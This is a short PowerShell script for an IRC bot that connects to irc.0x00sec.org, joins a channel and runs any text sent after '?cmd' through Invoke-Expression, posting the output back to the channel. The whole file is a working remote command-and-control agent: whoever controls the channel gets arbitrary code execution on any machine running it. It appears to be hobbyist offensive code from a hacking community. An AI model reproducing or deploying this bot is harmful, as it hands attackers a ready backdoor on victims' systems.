Function Connect-IRCServer ( 
    [Parameter(Mandatory=$True)][String]$Hostname, 
    [Parameter(Mandatory=$True)][UInt16]$Port)
{

    $channel = "#occutest"
    
    Try
    {
        $ErrorActionPreference = "Stop"
        $TCPClient  = New-Object System.Net.Sockets.TcpClient
        $IPEndpoint = New-Object System.Net.IPEndPoint($([Net.Dns]::GetHostEntry($Hostname)).AddressList[0], $Port)
        $TCPClient.Connect($IPEndpoint)
        $stream  = $TCPClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $buffer = New-Object System.Byte[] 1024
        $encoding = New-Object System.Text.ASCIIEncoding
        
        Write-Host "[+] Created Socket Client..."
        if($TCPClient.Connected) { Write-Host "[+] Connected to server" }
        
        $writer.WriteLine("USER powershell 8 x :powerbot")
        $writer.Flush()
        $writer.WriteLine("NICK PowerBot")
        $writer.Flush()
       
        while($True) {
            start-sleep -m 1000
            while($stream.DataAvailable) {
                $read = $stream.Read($buffer, 0, 1024)
                Write-Host -n ($encoding.GetString($buffer, 0, $read))
                $text_stream = $encoding.GetString($buffer, 0, $read)
                If ($text_stream.StartsWith("PING")) {
                    $writer.WriteLine($text_stream.Replace("PING","PONG"))
                    Write-Host "-->",$text_stream.Replace("PING","PONG")
                    $writer.Flush()
                    }
                If ($text_stream.Contains("MODE PowerBot :+iwx")) {
                    $writer.WriteLine([string]("JOIN",$channel))
                    $writer.Flush()
                    Write-Host "--> Joining",$channel
                    }
                
                #$text_stream -match '^[:](?<user>[\w]*)[!](?<host>[\w]*[@][\w.]*)[ ]([\w]*)[ ](?<channel>[+#\w]*)[ ][:][?](?<command>[\w]*)$'
                $m = $text_stream -match '^[:](?<user>[\w]*)[!]([\w]*[@][\w.]*)[ ]PRIVMSG[ ]([+#\w]*)[ ][:][?](?<command>[\w\W]*)$'
                if($m) {
                    if ($Matches.Count -gt 0) {
                        Write-Host "Matches the command regex"
                        Write-Host "Match results $Matches.user $Matches.command"
                        $command,$args = $Matches.command -split " "
                        Write-Host $command
                        Write-Host $args
                        if($command.Contains("test")) {
                                    Write-Host "Matched an actual command"
                                    $writer.WriteLine("PRIVMSG $channel $Matches.user : Regex match.")
                                    $writer.Flush()
                                }
                        if($command.Contains("quit")) {
                                    return
                                }
                        if($command.Contains("cmd")) {
                                    Write-Host "executing: $args"
                                    $r = iex "$args" | Out-String -Stream
                                    Write-Host $r
                                    $writer.WriteLine("PRIVMSG $channel $r")
                                    $writer.Flush()
                                    }
                            }
                        }
                }
            }
    }
    Finally
    {
        If ($NetStream) { $NetStream.Dispose() }
        If ($TCPClient) { $TCPClient.Dispose() }
        If ($writer) { $writer.Dispose() }
    }
}

Write-Host "Connecting to IRC server..."
Connect-IRCServer -Hostname irc.0x00sec.org -Port 6667